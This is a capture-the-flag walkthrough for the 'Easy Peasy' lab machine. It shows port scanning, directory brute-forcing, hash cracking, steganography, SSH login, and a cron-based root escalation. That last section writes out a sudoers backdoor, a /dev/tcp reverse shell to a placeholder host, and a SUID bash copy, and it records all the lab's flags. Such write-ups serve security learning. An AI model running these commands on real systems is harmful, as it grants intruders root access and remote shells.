@@ -1,0 +1,455 @@
+EASY PEASY.
+
+
+
+
+[>>> TASK 1: ENUMERATION THROUGH NMAP]
+[1.1. HOW MANY PORTS ARE OPEN?]
+[ACTION: quick rustscan]
+rustscan -a 10.10.22.49 -r 1-65535 -- -sV -T4 -sS
+[OUTPUT]
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 63 nginx 1.16.1
+6498/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+65524/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.43 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+3
+
+
+
+[1.2. WHAT IS THE VERSION OF NGINX?]
+[ANSWER (based on last output)]
+1.16.1
+
+
+
+[1.3. WHAT IS RUNNING ON THE HIGHEST PORT?]
+[ANSWER (based on last output)]
+apache
+
+
+
+
+[>>> TASK 2: COMPROMISING THE MACHINE]
+[2.1. USING GOBUSTER, FIND FLAG 1]
+[ACTION: quick gobuster scan for common directories]
+gobuster dir -u http://10.10.22.49 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/hidden               (Status: 301) [Size: 169] [--> http://10.10.22.49/hidden/]
+/index.html           (Status: 200) [Size: 612]
+/robots.txt           (Status: 200) [Size: 43]
+
+
+[ACTION: exploring http://10.10.22.49/hidden/]
+[OUTPUT]
+A creepy picture with no visible flag, neither on source (CTRL + u).
+
+
+[ACTION: scanning larger directory list on /hidden]
+gobuster dir -u http://10.10.22.49/hidden/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[OUTPUT]
+/whatever             (Status: 301) [Size: 169] [--> http://10.10.22.49/hidden/whatever/]
+
+
+[ACTION: exploring http://10.10.22.49/hidden/whatever/]
+[OUTPUT]
+An image of a guy hiking. 
+Source (CTRL + u) reveals a base 64 encoded string: ZmxhZ3tmMXJzN19mbDRnfQ==.
+
+
+[ACTION: decode base64 ZmxhZ3tmMXJzN19mbDRnfQ==]
+[OUTPUT]
+flag{f1rs7_fl4g}
+[ANSWER]
+flag{f1rs7_fl4g}
+
+
+
+[2.2. FURTHER ENUMERATE THE MACHINE, WHAT IS FLAG 2?]
+[ACTION: run a gobuster file scan on http://10.10.22.49]
+gobuster dir -u http://10.10.22.49 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+[NOTE]
+No useful output.
+
+
+[ACTION: longer directory scan on http://10.10.22.49]
+gobuster dir -u http://10.10.22.49/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[NOTE]
+No useful output.
+
+
+[NOTE]
+Gobuster default port is 80. 
+We will continue enumerating with gobuster, but port 65524.
+[ACTION: common gobuster scan on 65524]
+gobuster dir -u http://10.10.22.49:65524 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.hta                 (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/index.html           (Status: 200) [Size: 10818]
+/robots.txt           (Status: 200) [Size: 153]
+/server-status        (Status: 403) [Size: 279]
+
+[ACTION: file scan on 65542]
+gobuster dir -u http://10.10.22.49:65524 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+[OUTPUT]
+index.html           (Status: 200) [Size: 10818]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htaccess.bak        (Status: 403) [Size: 279]
+/.htaccess.zip        (Status: 403) [Size: 279]
+/robots.txt           (Status: 200) [Size: 153]
+/.                    (Status: 200) [Size: 10818]
+/.html                (Status: 403) [Size: 279]
+/.html.bak            (Status: 403) [Size: 279]
+...
+
+
+[ACTION: visit http://10.10.22.49:65524/robots.txt]
+[OUTPUT]
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+[NOTE]
+This means there are hidden files that will only be listed whe user-agent is set as the string provided.
+Therefore, we need to update our gobuster command.
+
+
+
+[ACTION: curl site with accepted user-agent, looking for flag type string]
+curl -A a18672860d0510e5ab6699730763b250 http://10.10.22.49:65524 | grep "flag*"
+[OUTPUT]
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0          <a href="#flag">hi</a>
+                           Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+100 10818  100 10818    0     0   126k      0 --:--:-- --:--:-- --:--:--  127k
+[NOTE]
+Somehow we found flag3, which is supposed to be protected by a hash (?).
+
+
+
+[NOTE]
+Turns out the user-agent string we found (a18672860d0510e5ab6699730763b250) is the hash.
+(The question formatting could have been done much better...)
+We echoed our user_agent into easy_peasy_hash.txt
+And downloaded the provided password list.
+[ACTION: john hash cracking]
+john --wordlist easypeasy_1596838725703.txt easy_peasy_hash.txt
+[NOTE]
+John reported an error. Probably due to not being able to identify the hash. 
+We will provide that as input.
+
+
+[ACTION: identify hash type]
+hashid a18672860d0510e5ab6699730763b250
+[OUTPUT]
+Analyzing 'a18672860d0510e5ab6699730763b250'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x 
+
+
+[ACTION: john attempt at md5]
+john --format=raw-md5 --wordlist=easypeasy_1596838725703.txt e
+asy_peasy_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2025-07-25 19:46) 0g/s 514100p/s 514100c/s 514100C/s yoly200..sunshine
+Session completed. 
+
+
+[NOTE]
+Since john is causing issues, we will try hashcat.
+[ACTION: hashcat attempt at md5]
+hashcat -m 0 -a 0 a18672860d0510e5ab6699730763b250 easypeasy_1596838725703.txt
+[OUTPUT]
+Status...........: Exhausted
+
+
+
+[NOTE]
+Looks like the issue is in the provided wordlist.
+We will try online tools.
+[ACTION: cracking via https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250]
+[OUTPUT]
+flag{1m_s3c0nd_fl4g}
+[ANSWER]
+flag{1m_s3c0nd_fl4g}
+
+
+
+[2.3. CRACK THE HASH WITH easypeasy.txt, WHAT IS THE FLAG 3?]
+[ANSWER (from previous output)]
+flag{9fdafbd64c47471a8f54cd3fc64cd312}
+
+
+
+[2.4. WHAT IS THE HIDDEN DIRECTORY?]
+[NOTE]
+Gobuster didn't find any interesting directory.
+There is probably a clue or commented link inside the source code.
+[ACTION: inspect source on http://10.10.22.49:65524/]
+[OUTPUT (snippet)]
+  <span class="floating_element">
+          Apache 2 It Works For Me
+	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
+        </span>
+
+
+[NOTE]
+Starting with ba, it is a baseX type of encoding.
+[ACTION: decode with cyberchef (https://gchq.github.io/CyberChef/)]
+[OUTPUT (base62)]
+/n0th1ng3ls3m4tt3r
+[ANSWER]
+/n0th1ng3ls3m4tt3r
+ 
+
+
+[2.5. USING THE WORDLIST THAT PROVIDED TO YOU IN THIS TASK CRACK THE HASH WHAT IS THE PASSWORD?]
+[ACTION: visit http://10.10.22.49:65524/n0th1ng3ls3m4tt3r/]
+[OUTPUT]
+Image displayed shows no useful info.
+Inspecting source, we find: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+
+
+[ACTION: crack hash with john]
+john --wordlist=easypeasy_1596838725703.txt hidden_hash.txt 
+[OUTPUT]
+0g 0:00:00:00 DONE (2025-07-25 20:07) 0g/s 514000p/s 514000c/s 514000C/s 123456..sunshine
+[NOTE]
+Looks like john is having issues.
+
+
+[ACTION: identify hash type]
+hashid 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+[OUTPUT]
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256) 
+
+
+[NOTE]
+After trying to run john with each one, we figure out gost r is the right one.
+[ACTION: john gost cracking]
+john --format=gost --wordlist=easypeasy_1596838725703.txt hidden_hash.txt
+[OUTPUT]
+mypasswordforthatjob
+[ANSWER]
+mypasswordforthatjob
+
+
+
+[2.6. WHAT IS THE PASSWORD TO LOGIN TO THE MACHINE VIA SSH?]
+[NOTE]
+I forgot to talk about the image that shows up on the top of http://10.10.22.49:65524/n0th1ng3ls3m4tt3r/.
+And since it looks like we need an ssh password, but we are at a dead end, that image probably holds clues.
+[ACTION: inspect source of http://10.10.22.49:65524/n0th1ng3ls3m4tt3r/]
+[OUTPUT]
+<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
+
+
+[NOTE]
+We need to decode the binary string in the image.
+Considering we just need the green part: 
+01010000101001010011
+10011010010000001010
+01010010010010010100
+It leads to nowhere. So if the image has any clues, it is embedded.
+We save the image to run metadata and steganography tools.
+Return no useful output: exiftool, binwalk.
+Steghide always prompts for a password, so we try the cracked hash: mypasswordforthatjob
+[ACTION: run steghide on binary image]
+steghide extract -sf
+[OUTPUT]
+wrote extracted data to "secrettext.txt".
+
+
+[ACTION: Read secret file]
+cat secrettext.txt
+[OUTPUT]
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+
+
+[ACTION: convert binary (password) to ascii]
+[OUTPUT]
+iconvertedmypasswordtobinary
+[NOTE]
+We got a credential pair, this is likely the ssh password.
+[ANSWER]
+iconvertedmypasswordtobinary
+
+
+
+[2.7. WHAT IS THE USER FLAG?]
+[NOTE]
+Reminder that ssh is running on port 6498, not default (22).
+[ACTION: ssh into boring]
+ssh boring@10.10.22.49 -p 6498
+
+
+[ACTION: check current directory content]
+ls
+[OUTPUT]
+user.txt
+
+
+[ACTION: read user flag]
+cat user.txt
+[OUTPUT]
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+[NOTE]
+Looks like a clear clue to the fact the flag is encoded in ROT.
+
+
+[ACTION: decode user flag via https://www.cachesleuth.com/rot.html]
+We read all rot variations, and only ROT-13 makes sense.
+[OUTPUT]
+flag{n0wits33msn0rm4l}
+
+
+
+[2.8. WHAT IS THE ROOT FLAG?]
+[ACTION: check sudo permissions]
+sudo -l
+[OUTPUT]
+Sorry, user boring may not run sudo on kral4-PC.
+
+
+[NOTE]
+Reading the room description, I realize we I am supposed to privesc via a cronjob.
+[ACTION: check system wide crontabs (often root ran)]
+cat /etc/crontab
+[OUTPUT]
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+
+[NOTE]
+We spot an eyecatching script, that is stored in a directory accesible to us: .mysecretcronob.sh
+[ACTION: move into www]
+cd /var/www
+
+
+[ACTION: list hidden files]
+ls -a
+[OUTPUT]
+.  ..  html  .mysecretcronjob.sh
+
+
+[ACTION: check permissions on script]
+ls -la
+[OUTPUT]
+drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
+[NOTE]
+We can write on the script.
+Also, it runs every minute, so if we manage to edit it to privesc, we wouldn't have to wait too much to figure out if it worked or not.
+
+
+[ACTION: check contents of script]
+cat .mysecretcronjob.sh
+[OUTPUT]
+#!/bin/bash
+# i will run as root
+[NOTE]
+Now we know for certain the script will be executed as root.
+There are 3 paths we can take to privesc:
+1. Add boring to sudoers:
+echo "boring ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+2. Spawn a reverse shell:
+#!/bin/bash
+bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
+3. Set the suid on rootbash:
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+For no particular reason, I will go with the third option.
+[ACTION: update script content to set suid]
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /var/www/.mysecretcronjob.sh
+
+
+[ACTION: verify updated script]
+cat .mysecretcronjob.sh
+[OUTPUT]
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+[NOTE]
+Wait at least 1 minute after updating the script and spawning the shell.
+[ACTION: spawn root shell]
+/tmp/rootbash -p
+[OUTPUT]
+rootbash-4.4#
+
+
+[ACTION: read root flag]
+cat /root/root.txt
+[OUTPUT]
+cat: /root/root.txt: No such file or directory
+
+
+[NOTE]
+root.txt is probably somewhere else.
+First, we will check if it is hidden.
+[ACTION: list hidden stuff in root]
+cd root; ls -la
+[OUTPUT]
+drwx------  5 root root 4096 Jun 15  2020 .
+drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+-rw-------  1 root root  883 Jun 15  2020 .bash_history
+-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+drwx------  2 root root 4096 Jun 13  2020 .cache
+drwx------  3 root root 4096 Jun 13  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+
+
+[ACTION: read root flag]
+cat .root.txt
+[OUTPUT]
+flag{63a9f0ea7bb98050796b649e85481845}
+
